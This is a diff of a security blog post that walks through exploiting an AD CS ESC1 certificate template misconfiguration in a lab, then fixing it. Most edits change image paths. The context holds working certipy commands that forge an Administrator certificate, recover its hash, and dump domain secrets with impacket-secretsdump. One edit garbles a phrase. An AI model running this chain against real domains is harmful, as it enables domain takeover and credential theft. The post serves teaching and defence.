@@ -6,7 +6,7 @@ date: "2025-10-03"
 readTime: "8 min read"
 category: "Active Directory"
 tags: ["ADCS", "Active Directory", "ESC1", "PKI", "Certipy", "Rubeus"]
-image: "/public/blog01/blog01-0.png" 
+image: "/blog01/blog01-0.png" 
 excerpt: "How a single 'Enrollee supplies subject' option on an AD CS template lets attackers mint logon-capable certificates for any user, including Domain Admins."
 featured: true
 ---
@@ -17,7 +17,7 @@ Certificates are crucial in establishing trust and securing communication within
 
 ## Active Directory Certificate Services (AD CS) Templates
 
-Active Directory Certificate Services (AD CS) templates are predefined certificate request configurations that allow administrators to define the characteristics of certificates that will be issued by the CA (Certificate Authority). Templates serve as blueprints for different types of certificates and their properties, making it easier to manage and issue certificates with consistent settings across an organization’s PKI (Public Key Infrastructure).
+Active Directory Certificate Services (AD CS) templates are predefined certificate request configurations that allow administrators to define the characteristics of certificates that will be issued by the CA (Certificate Authority). Templates serve as blueprints for different types of certificates and their properties, making it easier to manage and issue certificates with consistent settings across an organization’s PKI  Key Infrastructure).
 
 Administrators can streamline requesting, issuing, and managing certificates within an organization using templates. Templates ensure consistency, simplify the certificate issuance process, and help maintain security standards by enforcing specific configurations for different certifications.
 
@@ -40,14 +40,14 @@ For exploiting ESC1, we need the Template to meet certain criteria. The Template
 
 1. Certipy is a tool used for finding and exploiting certificates in Active Directory.
 
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-1.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-1.png)
 
 2. Run certipy against the domain controller to find any vulnerable templates.
 
 ```
 certipy find -vulnerable -dc-ip 192.168.0.144 -u Guts@ACU.local -p 'P@ssw0rd!'
 ```
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-2.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-2.png)
 
 
     - `-u`: Domain User  
@@ -59,9 +59,9 @@ certipy find -vulnerable -dc-ip 192.168.0.144 -u Guts@ACU.local -p 'P@ssw0rd!'
 
 3. Cat the created text file by certipy to see the vulnerable Template.
 
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-3.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-3.png)
 
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-4.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-4.png)
 
 
     From the output, it is clear that enrollment rights are set for Domain Users, Enrollee Supplies Subject is set to True, and Extended Key Usage has Client Authentication.
@@ -71,7 +71,7 @@ certipy find -vulnerable -dc-ip 192.168.0.144 -u Guts@ACU.local -p 'P@ssw0rd!'
     ```
     certipy req -dc-ip 192.168.0.144 -u Guts@ACU.local -p 'P@ssw0rd!' -ca ACU-ANIKATE-DC-CA -target ANIKATE-DC.ACU.local -template ESC1 -upn Administrator@ACU.local -dns Anikate-DC.ACU.local
     ```
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-5.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-5.png)
 
     - `ca`: Certificate Authority (ACU-ANIKATE-DC-CA in this case)  
     - `target`: CA Hostname (ANIKATE-DC.ACU.local in this case)  
@@ -84,7 +84,7 @@ certipy find -vulnerable -dc-ip 192.168.0.144 -u Guts@ACU.local -p 'P@ssw0rd!'
 ```
 certipy auth -pfx administrator_anikate-dc.pfx -dc-ip 192.168.0.144
 ```
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-6.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-6.png)
 
     - `auth`: Which identity to authenticate as (We are establishing as Administrator, so use 0, i.e., UPN: Administrator@ACU.local)  
     - `-pfx`: Saved Certificate (administrator_anikate-dc.pfx in this case)  
@@ -96,7 +96,7 @@ certipy auth -pfx administrator_anikate-dc.pfx -dc-ip 192.168.0.144
 ```
 impacket-secretsdump -hashes 'aad3b435b51404eeaad3b435b51404ee:9a0c89751f9ac637242da5ac889fa3aa' 'ACU.local/Administrator@192.168.0.144.'
 ```
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-7.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-7.png)
 
 
 ## Fixing the Misconfigured Certificate Template – ESC1
@@ -104,35 +104,35 @@ impacket-secretsdump -hashes 'aad3b435b51404eeaad3b435b51404ee:9a0c89751f9ac6372
 1. Open the Server Manager on your Certificate Authority.  
 2. Click on **Tools** and then **Certification Authority**.  
 
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-8.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-8.png)
 
 3. Right-click on **Certificate Templates** and click on **Manage**.  
 
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-9.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-9.png)
 
 4. Right-click on the vulnerable Template and click on **Properties**.  
 
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-10.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-10.png)
 
 5. Go to **Issuance Requirements** and check the **CA certificate manager approval** box.  
 
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-11.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-11.png)
 
 6. Go to **Subject Name**, select **Build from this Active Directory information** instead of **Supply in the request**, and click **Apply**.  
 
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-12.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-12.png)
 
 7. Go to **Security**, select the **Domain Users Group**, uncheck the **Enroll** box, and then click **Apply** and **OK**.  
 
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-13.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-13.png)
 
 8. Now rerun certipy.  
 
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-14.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-14.png)
 
 9. Cat the created text file by certipy to see if the vulnerable Template exists.  
 
-![ESC1 – AD CS Vulnerable Template](/public/blog01/blog01-15.png)
+![ESC1 – AD CS Vulnerable Template](/blog01/blog01-15.png)
 
 Certipy should not find any vulnerable templates.
 
